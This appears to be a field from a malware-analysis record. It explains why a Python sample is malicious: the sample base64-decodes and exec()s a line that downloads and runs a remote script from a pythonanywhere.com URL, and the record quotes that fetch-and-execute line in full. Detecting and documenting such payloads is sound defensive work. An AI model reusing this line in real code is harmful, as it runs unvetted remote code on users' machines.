      "malicious_behavior": "The code imports two obfuscated names from a relative module and then executes a base64-decoded payload using exec(). The decoded payload is: exec(__import__(\"importlib\").import_module(\"urllib.request\").urlopen(\"https://cyberresearch.pythonanywhere.com/reporter.py\").read().decode()). This means the code fetches a Python script from a suspicious, non-standard external URL (hosted on pythonanywhere.com, which is not a typical trusted source for production code) and executes it immediately without any user interaction or validation. This pattern of fetching and executing remote code dynamically is a classic hallmark of malicious behavior, enabling arbitrary code execution, potential payload delivery, and remote control. The use of base64 encoding to hide the URL and the exec() call to run the fetched code further confirms obfuscation and intent to evade detection. There is no legitimate application logic or user consent evident, and the code performs network activity solely to retrieve and run external code. Therefore, this code is highly suspicious and should be classified as malicious."
